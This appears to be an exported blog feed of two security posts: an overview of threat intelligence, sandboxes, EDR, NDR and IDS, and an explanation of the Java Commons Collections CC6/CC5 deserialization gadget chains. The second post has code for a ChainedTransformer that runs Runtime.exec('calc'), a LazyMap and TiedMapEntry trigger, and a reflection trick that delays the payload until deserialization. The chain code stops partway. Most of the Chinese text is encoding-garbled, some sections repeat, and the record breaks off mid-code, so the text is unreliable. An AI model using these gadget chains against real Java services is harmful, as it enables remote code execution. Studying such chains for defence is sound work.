å¨èƒæƒ…æŠ¥å¯ä»¥å¸®åŠ©ç½‘ç»œå®‰å…¨äººå‘˜äº†è§£å½“å‰çš„å¨èƒå½¢åŠ¿ï¼ŒåŠæ—¶å‘ç°å’Œè¯†åˆ«å®‰å…¨å¨èƒï¼Œä»¥ä¾¿é‡‡å–ç›¸åº”çš„åº”å¯¹æªæ–½ã€‚å¨èƒæƒ…æŠ¥çš„æ¥æºåŒ…æ‹¬è‡ªä¸»æ”¶é›†ã€å…±äº«äº¤æµç­‰å¤šç§å½¢å¼ï¼Œå…¶åˆ†æå’Œå¤„ç†è¿‡ç¨‹åˆ™éœ€è¦ä¾é å„ç§æŠ€æœ¯æ‰‹æ®µï¼Œå¦‚å¨èƒæƒ…æŠ¥åˆ†æå·¥å…·ã€æƒ…æŠ¥äº¤æ¢å¹³å°ç­‰ã€‚å¨èƒæƒ…æŠ¥çš„é‡è¦æ€§é€æ¸å—åˆ°å¹¿æ³›å…³æ³¨ï¼Œæˆä¸ºç½‘ç»œå®‰å…¨å·¥ä½œä¸­ä¸å¯æˆ–ç¼ºçš„ä¸€ç¯</p><p><strong>å¨èƒæƒ…æŠ¥</strong>å°±åƒç½‘ç»œä¸–ç•Œçš„ <strong>â€œæ•Œæƒ…æŠ¥å‘Šâ€</strong>ï¼Œä¸“é—¨ç”¨æ¥å¸®ä¼ä¸šå’Œæœºæ„ <strong>æå‰çœ‹æ¸…åäººè¦å¹²å•¥ã€æ€ä¹ˆå¹²ï¼Œç„¶åå µæ­»ä»–ä»¬çš„è·¯</strong>ã€‚ç®€å•æ¥è¯´ï¼Œå°±æ˜¯é€šè¿‡ <strong>æ”¶é›†åäººçš„ä½œæ¡ˆå·¥å…·ã€åˆ†æä»–ä»¬çš„å¥—è·¯ã€é¢„æµ‹ä»–ä»¬çš„ç›®æ ‡</strong>ï¼Œè®©ç½‘ç»œå®‰å…¨ä» <strong>â€œè¢«é»‘å®¢æ‰“å®Œäº†å†å“­â€</strong> å˜æˆ <strong>â€œæå‰æŠŠé—¨ç„Šæ­»â€</strong></p><p>å¸¸è§å¨èƒæƒ…æŠ¥å¹³å°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://x.threatbook.cn/</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://redqueen.tj-un.com/</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://ti.360.net/</span><br></pre></td></tr></table></figure><h2 id="æ²™ç®±"><a href="#æ²™ç®±" class="headerlink" title="æ²™ç®±"></a>æ²™ç®±</h2><p>æ²™ç®±æ˜¯æŒ‡ä¸€ç§åœ¨å®‰å…¨æµ‹è¯•å’Œå¼€å‘è¿‡ç¨‹ä¸­ä½¿ç”¨çš„è™šæ‹Ÿç¯å¢ƒï¼Œå¯ä»¥æ¨¡æ‹ŸçœŸå®çš„æ“ä½œç³»ç»Ÿå’Œåº”ç”¨ç¨‹åºç¯å¢ƒï¼Œä»¥ä¾¿è¿›è¡Œå®‰å…¨æµ‹è¯•ã€æ¶æ„è½¯ä»¶åˆ†æã€æ¼æ´æŒ–æ˜ç­‰æ“ä½œï¼ŒåŒæ—¶ä¸ä¼šå¯¹çœŸå®ç¯å¢ƒé€ æˆå½±å“ã€‚</p><p> åœ¨æ²™ç®±ä¸­ï¼Œå¯ä»¥è¿è¡Œä¸å—ä¿¡ä»»çš„åº”ç”¨ç¨‹åºå’Œä»£ç ï¼ŒåŒæ—¶ç›‘æ§å…¶è¡Œä¸ºå’Œå½±å“ï¼Œä»¥ä¾¿åŠæ—¶å‘ç°å’Œå¤„ç†å®‰å…¨é—®é¢˜ã€‚æ²™ç®±é€šå¸¸å…·æœ‰éš”ç¦»ã€å¿«ç…§ã€è¿˜åŸã€è°ƒè¯•ç­‰åŠŸèƒ½ï¼Œå¯ä»¥å¸®åŠ©ç ”ç©¶äººå‘˜æ·±å…¥åˆ†ææ¶æ„ä»£ç çš„è¡Œä¸ºå’Œç‰¹å¾ï¼Œå‘ç°æ½œåœ¨çš„æ¼æ´å’Œå®‰å…¨é£é™©ã€‚</p><p> æ²™ç®±å¹¿æ³›åº”ç”¨äºæ¶æ„è½¯ä»¶åˆ†æã€æ¼æ´æŒ–æ˜ã€ç½‘ç»œå®‰å…¨æµ‹è¯•ã€åº”ç”¨ç¨‹åºå¼€å‘å’Œæµ‹è¯•ç­‰é¢†åŸŸï¼Œå¯ä»¥å¸®åŠ©æé«˜å®‰å…¨æ€§å’Œå¯é æ€§ï¼Œå‡å°‘å®‰å…¨é£é™©å’ŒæŸå¤±ã€‚</p><p><strong>æ²™ç®±</strong>å°±åƒç½‘ç»œä¸–ç•Œçš„ <strong>â€œå„¿ç«¥æ²™ç›˜æ¸¸æˆåŒºâ€</strong>â€”â€”åœ¨è¿™ä¸ªéš”ç¦»çš„å°ç©ºé—´é‡Œï¼Œç¨‹åºå¯ä»¥éšä¾¿â€œç©â€ï¼ˆè¿è¡Œï¼‰ï¼Œä½†æ— è®ºæ€ä¹ˆæŠ˜è…¾éƒ½ <strong>ä¸ä¼šå½±å“åˆ°å¤–é¢çš„çœŸå®ä¸–ç•Œ</strong>ã€‚ç®€å•æ¥è¯´ï¼Œå®ƒæ˜¯ä¸€ä¸ª <strong>å®‰å…¨çš„éš”ç¦»ç¯å¢ƒ</strong>ï¼Œä¸“é—¨ç”¨æ¥æµ‹è¯•å¯ç–‘æ–‡ä»¶ã€è¿è¡ŒæœªçŸ¥ç¨‹åºï¼Œæˆ–è€…å¤„ç†æ•æ„Ÿæ•°æ®ï¼Œæ—¢èƒ½æ»¡è¶³åŠŸèƒ½éœ€æ±‚ï¼Œåˆèƒ½é¿å…æç ¸æ•´ä¸ªç³»ç»Ÿ</p><h2 id="ç»ˆç«¯é˜²æŠ¤ï¼ˆEDRï¼‰"><a href="#ç»ˆç«¯é˜²æŠ¤ï¼ˆEDRï¼‰" class="headerlink" title="ç»ˆç«¯é˜²æŠ¤ï¼ˆEDRï¼‰"></a>ç»ˆç«¯é˜²æŠ¤ï¼ˆEDRï¼‰</h2><p>ç»ˆç«¯æ£€æµ‹å’Œå“åº” (EDR) æ˜¯ä¸€æ¬¾è½¯ä»¶ï¼Œæ—¨åœ¨è‡ªåŠ¨ä¿æŠ¤ç»„ç»‡çš„æœ€ç»ˆç”¨æˆ·ã€ç»ˆç«¯è®¾å¤‡å’Œ IT èµ„äº§å…å—é‚£äº›çªç ´é˜²ç—…æ¯’è½¯ä»¶å’Œå…¶ä»–ä¼ ç»Ÿç»ˆç«¯å®‰å…¨å·¥å…·å®‰å…¨é˜²çº¿çš„ç½‘ç»œå¨èƒã€‚ EDR å°†ä»ç½‘ç»œä¸Šçš„æ‰€æœ‰ç»ˆç«¯ï¼ˆå°å¼æœºå’Œç¬”è®°æœ¬ç”µè„‘ã€æœåŠ¡å™¨ã€ç§»åŠ¨è®¾å¤‡ã€IoTï¼ˆç‰©è”ç½‘ï¼‰è®¾å¤‡ç­‰ï¼‰ ä¸­è¿ç»­æ”¶é›†æ•°æ®ã€‚ å®ƒå°†å®æ—¶åˆ†æè¿™äº›æ•°æ®ä»¥æŸ¥æ‰¾å·²çŸ¥æˆ–ç–‘ä¼¼ç½‘ç»œå¨èƒçš„è¯æ®ï¼Œå¹¶ä¸”å¯ä»¥è‡ªåŠ¨ä½œå‡ºå“åº”ä»¥é˜²æ­¢æˆ–å°½å¯èƒ½å‡å°‘æ‰€è¯†åˆ«å¨èƒé€ æˆçš„æŸå¤±ã€‚</p><p>ä½ ç”µè„‘é‡Œæœ‰ä¸ªæ–‡ä»¶çªç„¶å¼€å§‹ç–¯ç‹‚åˆ ä¸œè¥¿ï¼Œä¼ ç»Ÿæ€æ¯’è½¯ä»¶å¯èƒ½ä¸è®¤è¯†å®ƒï¼Œä½†EDRä¼šç«‹åˆ»å‘ç°è¿™æ–‡ä»¶â€œè¡Œä¸ºå¼‚å¸¸â€ï¼Œç›´æ¥æŠŠå®ƒå…³è¿›å°é»‘å±‹ï¼Œç„¶åé€šçŸ¥ç®¡ç†å‘˜ï¼šâ€œæŠ“åˆ°ä¸€ä¸ªæç ´åçš„ï¼â€</p><h2 id="NDR"><a href="#NDR" class="headerlink" title="NDR"></a>NDR</h2><p><strong>NDR</strong>ï¼ˆç½‘ç»œå¨èƒæ£€æµ‹ä¸å“åº”ï¼‰å°±åƒæ˜¯<strong>ç½‘ç»œçš„â€œæ™ºèƒ½ç›‘æ§ç³»ç»Ÿâ€</strong>ï¼Œä¸“é—¨ç›¯ç€ä½ å®¶ç½‘ç»œé‡Œçš„â€œè½¦æµâ€ï¼ˆæ•°æ®æµåŠ¨ï¼‰ï¼Œä¸€æ—¦å‘ç°å¯ç–‘è½¦è¾†ï¼ˆæ¯”å¦‚é»‘å®¢æ”»å‡»ã€ç—…æ¯’ä¼ æ’­ï¼‰ï¼Œå®ƒèƒ½ç«‹åˆ»æŠ¥è­¦ï¼Œç”šè‡³è‡ªåŠ¨æ‹¦ä¸‹è¿™äº›å±é™©åˆ†å­ã€‚<br>NDRå°±åƒ<strong>å…¨ç½‘æ‘„åƒå¤´+è‡ªåŠ¨è­¦æŠ¥å™¨</strong>ï¼Œä¿æŠ¤å®¢æˆ·æ•°æ®ä¸è¢«é»‘å®¢çªƒå–</p><h2 id="IDS"><a href="#IDS" class="headerlink" title="IDS"></a>IDS</h2><p><strong>æ—æŒ‚è®¾å¤‡</strong><br><strong>åœ¨ç½‘ç»œä¸­éƒ¨ç½²IDSè®¾å¤‡å¯ä»¥å¯¹æ•´ä¸ªç½‘ç»œç³»ç»Ÿè¿›è¡Œå®æ—¶ç›‘è§†</strong>ï¼Œå®ƒæŠ“å–ç½‘ç»œä¸­æŒ‡å®šçš„æ•°æ®åŒ…ï¼Œå¯¹å…¶åˆ†æå’Œç»Ÿè®¡ï¼Œå¹¶èƒ½å¤Ÿå±•ç¤ºå…¨é¢çš„ç½‘ç»œç›‘æ§æŠ¥è¡¨ã€‚å¯¹äºåˆ†æå‘ç°çš„å…·æœ‰å¨èƒçš„ç½‘ç»œæ•°æ®æˆ–è€…è¡Œä¸ºäº§ç”Ÿå‘Šè­¦ã€‚IDSçš„ä½¿ç”¨ç»™ç½‘ç»œç®¡ç†äººå‘˜æä¾›äº†éå¸¸å¥½çš„è¾…åŠ©ç®¡ç†å·¥å…·å’Œè¿ç»´ä¾æ®ã€‚</p><p>å¸¸è§å‚å•†è®¾å¤‡</p><h3 id="å¥‡å®‰ä¿¡â€œå¤©çœ¼ï¼ˆNDRï¼‰â€"><a href="#å¥‡å®‰ä¿¡â€œå¤©çœ¼ï¼ˆNDRï¼‰â€" class="headerlink" title="å¥‡å®‰ä¿¡â€œå¤©çœ¼ï¼ˆNDRï¼‰â€"></a>å¥‡å®‰ä¿¡â€œå¤©çœ¼ï¼ˆ<strong>NDR</strong>ï¼‰â€</h3><p>å¥‡å®‰ä¿¡â€œå¤©çœ¼â€æ˜¯ä¸€æ¬¾<strong>é«˜çº§å¨èƒæ£€æµ‹ä¸å“åº”ç³»ç»Ÿ</strong>ï¼Œä¸»è¦ç”¨äºç›‘æµ‹å’Œåˆ†æç½‘ç»œä¸­çš„é«˜çº§å¨èƒï¼ˆå¦‚APTæ”»å‡»ã€å‹’ç´¢è½¯ä»¶ã€æœ¨é©¬ç­‰ï¼‰ï¼Œé€šè¿‡æµé‡åˆ†æã€å¨èƒæƒ…æŠ¥åŒ¹é…ã€æ”»å‡»é“¾è¿˜åŸç­‰æŠ€æœ¯ï¼Œå®ç°<strong>å…¨æµç¨‹å¨èƒæ„ŸçŸ¥ä¸å¤„ç½®</strong>ã€‚å…¶æ ¸å¿ƒåŠŸèƒ½åŒ…æ‹¬ï¼š</p><p><strong>APTæ”»å‡»æ£€æµ‹</strong>ï¼šé€šè¿‡æµé‡é•œåƒé‡‡é›†ã€æ–‡ä»¶è™šæ‹Ÿæ‰§è¡Œï¼ˆæ²™ç®±ï¼‰ã€å¨èƒæƒ…æŠ¥åŒ¹é…ç­‰æŠ€æœ¯ï¼Œç²¾å‡†è¯†åˆ«éšè”½æ€§å¼ºçš„å®šå‘æ”»å‡»</p><p><strong>ç½‘ç»œæµé‡æ·±åº¦è§£æ</strong>ï¼šè¿˜åŸHTTPã€SMTPç­‰åè®®æµé‡ï¼Œæå–ç½‘ç»œå±‚åˆ°åº”ç”¨å±‚çš„æ—¥å¿—æ•°æ®ï¼Œå¹¶åŠ å¯†ä¼ è¾“è‡³åˆ†æå¹³å°å­˜å‚¨</p><p><strong>å¨èƒæƒ…æŠ¥æ•´åˆ</strong>ï¼šç»“åˆå¥‡å®‰ä¿¡è‡ªæœ‰çš„æµ·é‡å¨èƒæƒ…æŠ¥åº“ï¼ˆå¦‚æ¶æ„IPã€åŸŸåã€æ–‡ä»¶å“ˆå¸Œå€¼ï¼‰ï¼Œå®æ—¶åŒ¹é…æ”»å‡»è¡Œä¸º</p><p><strong>æ”»å‡»é“¾å¯è§†åŒ–ä¸æº¯æº</strong>ï¼šåŸºäºATT&amp;CKæ¨¡å‹ï¼Œå°†å‘Šè­¦äº‹ä»¶å…³è”æˆæ”»å‡»é“¾ï¼Œå±•ç¤ºæ”»å‡»è·¯å¾„ã€å—æ„ŸæŸ“èµ„äº§åŠä¿¡æ¯æ³„éœ²æƒ…å†µï¼Œæ”¯æŒå…¨åŒ…å–è¯åˆ†æï¼ˆç±»ä¼¼Wiresharkï¼‰</p><p><strong>è‡ªåŠ¨åŒ–å“åº”å¤„ç½®</strong>ï¼šä¸é˜²ç«å¢™ã€ç»ˆç«¯EDRç­‰è®¾å¤‡è”åŠ¨ï¼Œå®ç°å‘Šè­¦è‡ªåŠ¨å°å µã€éš”ç¦»å—æ„ŸæŸ“ä¸»æœºç­‰æ“ä½œ</p><h4 id="ç³»ç»Ÿç»„æˆ"><a href="#ç³»ç»Ÿç»„æˆ" class="headerlink" title="ç³»ç»Ÿç»„æˆ"></a><strong>ç³»ç»Ÿç»„æˆ</strong></h4><p>å¤©çœ¼ç³»ç»Ÿä¸»è¦ç”±ä»¥ä¸‹æ¨¡å—æ„æˆï¼š</p><p><strong>åˆ†æå¹³å°ï¼ˆç¡¬ä»¶ï¼‰</strong>ï¼šå­˜å‚¨æµé‡æ—¥å¿—å’Œå‘Šè­¦æ•°æ®ï¼Œæä¾›å¨èƒåˆ†æã€æ€åŠ¿æ„ŸçŸ¥å¤§å±å±•ç¤ºï¼Œæ”¯æŒåˆ†å¸ƒå¼å­˜å‚¨å’Œå¿«é€Ÿæ£€ç´¢</p><p><strong>æµé‡ä¼ æ„Ÿå™¨ï¼ˆæ¢é’ˆï¼‰</strong>ï¼šéƒ¨ç½²åœ¨ç½‘ç»œé•œåƒå£ï¼Œå®æ—¶é‡‡é›†å¹¶è§£ææµé‡ï¼Œè¿˜åŸåè®®å†…å®¹ï¼Œç”Ÿæˆæ—¥å¿—å’Œå‘Šè­¦</p><p><strong>æ–‡ä»¶å¨èƒé‰´å®šå™¨ï¼ˆæ²™ç®±ï¼‰</strong>ï¼šå¯¹å¯ç–‘æ–‡ä»¶ï¼ˆå¦‚é‚®ä»¶é™„ä»¶ã€ä¸‹è½½æ–‡ä»¶ï¼‰è¿›è¡Œè™šæ‹Ÿæ‰§è¡Œï¼Œæ£€æµ‹æ¶æ„è¡Œä¸º</p><p><strong>å¨èƒæƒ…æŠ¥ï¼ˆè½¯ä»¶ï¼‰</strong>ï¼šé›†æˆæ¶æ„æ ·æœ¬ç‰¹å¾ã€æ”»å‡»è€…TTPsï¼ˆæˆ˜æœ¯ã€æŠ€æœ¯ã€è¿‡ç¨‹ï¼‰ç­‰æ•°æ®ï¼Œæ”¯æ’‘å¨èƒåŒ¹é…</p>]]></content>
      
      
      <categories>
          
          <category> hvv </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hvv </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cc5</title>
      <link href="/2025/03/27/cc5/"/>
      <url>/2025/03/27/cc5/</url>
      
        <content type="html"><![CDATA[<p>ä¹‹å‰åˆ†æè¿‡äº†cc6 cc5åªä¸è¿‡å’Œcc6é“¾å­å…¥å£ç‚¹ä¸ä¸€æ ·</p><p>å…ˆæ€»ç»“ä¸‹cc6</p><h4 id="1-é€ ç‚¸å¼¹ï¼šç»„è£…æ¶æ„ä»£ç é“¾æ¡"><a href="#1-é€ ç‚¸å¼¹ï¼šç»„è£…æ¶æ„ä»£ç é“¾æ¡" class="headerlink" title="1. é€ ç‚¸å¼¹ï¼šç»„è£…æ¶æ„ä»£ç é“¾æ¡"></a><strong>1. é€ ç‚¸å¼¹ï¼šç»„è£…æ¶æ„ä»£ç é“¾æ¡</strong></h4><p><strong>æ ¸å¿ƒæ­¦å™¨</strong>ï¼š<code>ChainedTransformer</code>ï¼ˆé“¾æ¡è½¬æ¢å™¨ï¼‰</p><p>é€šè¿‡åå°„è°ƒç”¨<code>Runtime.getRuntime().exec(&quot;calc&quot;)</code>ï¼Œç›¸å½“äºæŠŠå¼¹è®¡ç®—å™¨çš„æŒ‡ä»¤æ‹†æˆå››æ­¥ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = &#123;  </span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),      <span class="comment">// æ‹¿åˆ°Runtimeç±»  </span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, ...),     <span class="comment">// è·å–getRuntimeæ–¹æ³•  </span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, ...),        <span class="comment">// æ‰§è¡ŒgetRuntime()å¾—åˆ°å®ä¾‹  </span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, ...)           <span class="comment">// è°ƒç”¨execå¼¹è®¡ç®—å™¨  </span></span><br><span class="line">&#125;;  </span><br></pre></td></tr></table></figure><p><strong>ä½œç”¨</strong>ï¼šè¿™å››æ­¥åƒæµæ°´çº¿ä¸€æ ·ä¸²è”ï¼Œæœ€ç»ˆæ‰§è¡Œå‘½ä»¤</p><h3 id="å¤§ç™½è¯è§£é‡ŠCC6é“¾çš„è§¦å‘æµç¨‹"><a href="#å¤§ç™½è¯è§£é‡ŠCC6é“¾çš„è§¦å‘æµç¨‹" class="headerlink" title="å¤§ç™½è¯è§£é‡ŠCC6é“¾çš„è§¦å‘æµç¨‹"></a>å¤§ç™½è¯è§£é‡ŠCC6é“¾çš„è§¦å‘æµç¨‹</h3><p>CC6é“¾å°±åƒåœ¨<strong>å¿«é€’åŒ…è£¹é‡Œè—äº†ä¸€ä¸ªå…¨è‡ªåŠ¨ç‚¸å¼¹</strong>ï¼Œå½“ç›®æ ‡æœåŠ¡å™¨æ‹†å¼€åŒ…è£¹ï¼ˆååºåˆ—åŒ–æ•°æ®ï¼‰æ—¶ï¼Œä¼šè§¦å‘ä¸€ç³»åˆ—è¿é”ååº”ï¼Œæœ€ç»ˆæ‰§è¡Œæ¶æ„å‘½ä»¤ï¼ˆå¦‚å¼¹è®¡ç®—å™¨ï¼‰ã€‚ä»¥ä¸‹æ˜¯é€šä¿—æ‹†è§£ï¼š</p><hr><h4 id="1-é€ ç‚¸å¼¹ï¼šç»„è£…æ¶æ„ä»£ç é“¾æ¡-1"><a href="#1-é€ ç‚¸å¼¹ï¼šç»„è£…æ¶æ„ä»£ç é“¾æ¡-1" class="headerlink" title="1. é€ ç‚¸å¼¹ï¼šç»„è£…æ¶æ„ä»£ç é“¾æ¡"></a><strong>1. é€ ç‚¸å¼¹ï¼šç»„è£…æ¶æ„ä»£ç é“¾æ¡</strong></h4><p>- </p><p>  æ ¸å¿ƒæ­¦å™¨</p><p>  ï¼š</p>  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ChainedTransformer</span><br></pre></td></tr></table></figure><p>  ï¼ˆé“¾æ¡è½¬æ¢å™¨ï¼‰</p><ul><li><p>é€šè¿‡åå°„è°ƒç”¨</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Runtime.getRuntime().exec(&quot;calc&quot;)</span><br></pre></td></tr></table></figure><p>ç›¸å½“äºæŠŠå¼¹è®¡ç®—å™¨çš„æŒ‡ä»¤æ‹†æˆå››æ­¥ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = &#123;  </span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),      <span class="comment">// æ‹¿åˆ°Runtimeç±»  </span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, ...),     <span class="comment">// è·å–getRuntimeæ–¹æ³•  </span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, ...),        <span class="comment">// æ‰§è¡ŒgetRuntime()å¾—åˆ°å®ä¾‹  </span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, ...)           <span class="comment">// è°ƒç”¨execå¼¹è®¡ç®—å™¨  </span></span><br><span class="line">&#125;;  </span><br></pre></td></tr></table></figure></li><li><p><strong>ä½œç”¨</strong>ï¼šè¿™å››æ­¥åƒæµæ°´çº¿ä¸€æ ·ä¸²è”ï¼Œæœ€ç»ˆæ‰§è¡Œå‘½ä»¤ã€‚</p></li></ul><hr><h4 id="2-ä¼ªè£…ç‚¸å¼¹ï¼šLazyMapçš„â€œæ‡’åŠ è½½â€ç‰¹æ€§"><a href="#2-ä¼ªè£…ç‚¸å¼¹ï¼šLazyMapçš„â€œæ‡’åŠ è½½â€ç‰¹æ€§" class="headerlink" title="2. ä¼ªè£…ç‚¸å¼¹ï¼šLazyMapçš„â€œæ‡’åŠ è½½â€ç‰¹æ€§"></a><strong>2. ä¼ªè£…ç‚¸å¼¹ï¼šLazyMapçš„â€œæ‡’åŠ è½½â€ç‰¹æ€§</strong></h4><p><strong>æœºå…³è®¾ç½®</strong>ï¼š<code>LazyMap</code>ï¼ˆæ‡’åŠ è½½åœ°å›¾ï¼‰</p><ul><li>å½“è°ƒç”¨<code>LazyMap.get(&quot;ä¸å­˜åœ¨çš„key&quot;)</code>æ—¶ï¼Œå¦‚æœ<code>key</code>ä¸å­˜åœ¨ï¼Œå°±ä¼šè§¦å‘é¢„è®¾çš„æ¶æ„é“¾æ¡ï¼ˆ<code>ChainedTransformer</code>ï¼‰ã€‚</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), chain);  </span><br></pre></td></tr></table></figure><p><strong>é—®é¢˜</strong>ï¼šç›´æ¥è°ƒç”¨<code>get</code>ä¼šæå‰è§¦å‘ç‚¸å¼¹ï¼Œéœ€åç»­ç»•è¿‡</p><h4 id="3-è®¾ç½®è§¦å‘å¼€å…³ï¼šTiedMapEntryçš„hashCode"><a href="#3-è®¾ç½®è§¦å‘å¼€å…³ï¼šTiedMapEntryçš„hashCode" class="headerlink" title="3. è®¾ç½®è§¦å‘å¼€å…³ï¼šTiedMapEntryçš„hashCode"></a><strong>3. è®¾ç½®è§¦å‘å¼€å…³ï¼šTiedMapEntryçš„hashCode</strong></h4><p><strong>å…³é”®è·³æ¿</strong>ï¼š<code>TiedMapEntry</code>ï¼ˆç»‘å®šåœ°å›¾çš„å…¥å£ï¼‰</p><p>æŠŠ<code>LazyMap</code>å’Œä¸€ä¸ªå‡<code>key</code>ï¼ˆå¦‚<code>&quot;fakeKey&quot;</code>ï¼‰ç»‘å®šåˆ°<code>TiedMapEntry</code>ä¸­</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;fakeKey&quot;</span>);  </span><br></pre></td></tr></table></figure><p><strong>è§¦å‘é€»è¾‘</strong>ï¼š</p><ul><li>å½“è°ƒç”¨<code>entry.hashCode()</code>æ—¶ï¼Œå†…éƒ¨ä¼šæ‰§è¡Œ<code>getValue()</code> â†’ <code>lazyMap.get(&quot;fakeKey&quot;)</code> â†’ è§¦å‘ç‚¸å¼¹ã€‚</li></ul><h4 id="4-ç»•è¿‡æå‰çˆ†ç‚¸ï¼šåå°„ä¿®æ”¹LazyMapçš„å·¥å‚"><a href="#4-ç»•è¿‡æå‰çˆ†ç‚¸ï¼šåå°„ä¿®æ”¹LazyMapçš„å·¥å‚" class="headerlink" title="4. ç»•è¿‡æå‰çˆ†ç‚¸ï¼šåå°„ä¿®æ”¹LazyMapçš„å·¥å‚"></a><strong>4. ç»•è¿‡æå‰çˆ†ç‚¸ï¼šåå°„ä¿®æ”¹LazyMapçš„å·¥å‚</strong></h4><p><strong>å‘ç‚¹</strong>ï¼šåˆå§‹åŒ–<code>LazyMap</code>æ—¶è‹¥ç›´æ¥ç»‘å®šæ¶æ„é“¾æ¡ï¼Œæµ‹è¯•æ—¶ä¼šæå‰å¼¹è®¡ç®—å™¨</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å…ˆç”¨æ— å®³çš„Transformeråˆå§‹åŒ–  </span></span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));  </span><br><span class="line"><span class="comment">// åå°„å·å·æ›¿æ¢æˆæ¶æ„é“¾æ¡  </span></span><br><span class="line"><span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> lazyMap.getClass().getDeclaredField(<span class="string">&quot;factory&quot;</span>);  </span><br><span class="line">factoryField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">factoryField.set(lazyMap, chain);  </span><br></pre></td></tr></table></figure><p>ç¡®ä¿ç‚¸å¼¹åªåœ¨ååºåˆ—åŒ–æ—¶å¼•çˆ†</p><h4 id="5-è‡ªåŠ¨å¼•çˆ†ï¼šHashMapçš„ååºåˆ—åŒ–æœºåˆ¶"><a href="#5-è‡ªåŠ¨å¼•çˆ†ï¼šHashMapçš„ååºåˆ—åŒ–æœºåˆ¶" class="headerlink" title="5. è‡ªåŠ¨å¼•çˆ†ï¼šHashMapçš„ååºåˆ—åŒ–æœºåˆ¶"></a><strong>5. è‡ªåŠ¨å¼•çˆ†ï¼šHashMapçš„ååºåˆ—åŒ–æœºåˆ¶</strong></h4><p><strong>æœ€ç»ˆæœºå…³</strong>ï¼š<code>HashMap</code>çš„<code>readObject</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();  </span><br><span class="line">map.put(entry, <span class="string">&quot;ä»»æ„å€¼&quot;</span>);  </span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Gadget chain:</span></span><br><span class="line"><span class="comment">        ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">            BadAttributeValueExpException.readObject()</span></span><br><span class="line"><span class="comment">                TiedMapEntry.toString()</span></span><br><span class="line"><span class="comment">                    LazyMap.get()</span></span><br><span class="line"><span class="comment">                        ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">                            ConstantTransformer.transform()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                                Method.invoke()</span></span><br><span class="line"><span class="comment">                                    Class.getMethod()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                                Method.invoke()</span></span><br><span class="line"><span class="comment">                                    Runtime.getRuntime()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                                Method.invoke()</span></span><br><span class="line"><span class="comment">                                    Runtime.exec()</span></span><br><span class="line"><span class="comment">Requires:</span></span><br><span class="line"><span class="comment">commons-collections</span></span><br><span class="line"><span class="comment">This only works in JDK 8u76 and WITHOUT a security manager</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p>CC6æ˜¯åˆ©ç”¨<code>TiedMapEntry</code>ä¸­çš„<code>hashCode</code>å‡½æ•°ï¼›CC5æ˜¯åˆ©ç”¨<code>TiedMapEntry</code>ä¸­çš„<code>toString</code>å‡½æ•°;ä¸ºä»€ä¹ˆè¿˜å¯ä»¥åˆ©ç”¨<code>toString</code>æ–¹æ³•ï¼›å…¶å®ä¹Ÿå°±æ˜¯å› ä¸º<code>toString</code>ä¹Ÿè°ƒç”¨äº†è°ƒç”¨äº†<code>getValue</code>æ–¹æ³•çš„åŸå› </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> getKey() + <span class="string">&quot;=&quot;</span> + getValue();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span 